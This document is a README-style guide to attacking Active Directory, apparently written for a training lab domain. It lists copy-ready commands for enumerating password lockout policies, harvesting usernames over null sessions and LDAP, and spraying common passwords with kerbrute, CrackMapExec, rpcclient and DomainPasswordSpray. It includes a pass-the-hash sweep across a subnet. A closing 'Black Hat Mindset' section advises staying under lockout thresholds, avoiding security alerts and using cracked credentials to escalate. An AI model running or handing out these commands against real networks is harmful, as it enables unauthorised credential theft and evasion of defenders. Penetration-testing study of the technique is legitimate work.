# Active Directory Password Spraying and Password Policies

This README focuses on enumerating AD password policies to understand lockout thresholds and performing password spraying attacks to guess credentials without triggering account lockouts.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating Password Policies](#enumerating-password-policies)
- [Enumerating Users](#enumerating-users)
- [Performing Password Spraying](#performing-password-spraying)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Password spraying involves testing a single password (e.g., `Welcome1`) against many user accounts to avoid lockouts, while password policy enumeration reveals constraints like minimum length or lockout thresholds. This guide uses CrackMapExec, rpcclient, enum4linux, ldapsearch, PowerView, kerbrute, and DomainPasswordSpray to enumerate policies and spray passwords in an AD environment.

## Setup and Prerequisites

### Environment Requirements
- Linux host for CrackMapExec, rpcclient, enum4linux, ldapsearch, kerbrute, and windapsearch
- Windows host for PowerView and DomainPasswordSpray

### Tool Installation
- **CrackMapExec**: Install on Linux (e.g., `pip install crackmapexec`)
- **rpcclient**: Install on Linux (e.g., part of samba-common-bin, `apt install samba-common-bin`)
- **enum4linux**: Install on Linux (e.g., `apt install enum4linux`)
- **enum4linux-ng**: Install on Linux (e.g., `pip install enum4linux-ng`)
- **ldapsearch**: Install on Linux (e.g., part of ldap-utils, `apt install ldap-utils`)
- **kerbrute**: Download the binary on Linux (e.g., from its GitHub repo) and place in your working directory
- **windapsearch**: Download windapsearch.py on Linux (e.g., from its GitHub repo)
- **PowerView**: Load into memory on Windows
- **DomainPasswordSpray**: Download DomainPasswordSpray.ps1 on Windows and place in your working directory
- **PowerShell**: Run with appropriate privileges on Windows (right-click > "Run as Administrator")

### Additional Requirements
- Network Access: Ensure connectivity to the target domain controller or host (e.g., 172.16.5.5)
- User List: Prepare a file (e.g., `valid_users.txt`) with usernames for spraying

## Enumerating Password Policies

Understand the domain's password policies to craft a safe spraying strategy.

```bash
# Using CrackMapExec with valid credentials
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Establishing SMB NULL session
rpcclient -U "" -N 172.16.5.5

# Using rpcclient to enumerate policy
rpcclient $> querydominfo

# Using enum4linux
enum4linux -P 172.16.5.5

# Using enum4linux-ng
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Windows commands
net accounts

# PowerView commands
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

## Enumerating Users

Gather a list of users to target with password spraying.

```bash
# Generate username combinations
#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do
    echo $x
done

# Using enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers

# Using CrackMapExec
crackmapexec smb 172.16.5.5 --users

# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Using windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

## Performing Password Spraying

Test a common password against the user list without triggering lockouts.

```bash
# Using rpcclient
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done

# Using kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Using CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Using DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Black Hat Mindset

- **Understand Policies**: Analyze lockout thresholds to spray passwords safely without locking accounts
- **Target Common Passwords**: Use seasonal or default passwords (e.g., `Welcome1`, `Password123`) likely to succeed
- **Minimize Noise**: Use `--local-auth` or tools like kerbrute to avoid triggering security alerts
- **Expand Access**: Use cracked credentials to enumerate further or escalate privileges

## Resources

- [CrackMapExec Guide](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [enum4linux Documentation](https://labs.portcullis.co.uk/tools/enum4linux/)
- [kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [windapsearch GitHub](https://github.com/ropnop/windapsearch)
- [DomainPasswordSpray GitHub](https://github.com/dafthack/DomainPasswordSpray)
- [Password Spraying Techniques](https://attack.mitre.org/techniques/T1110/003/)

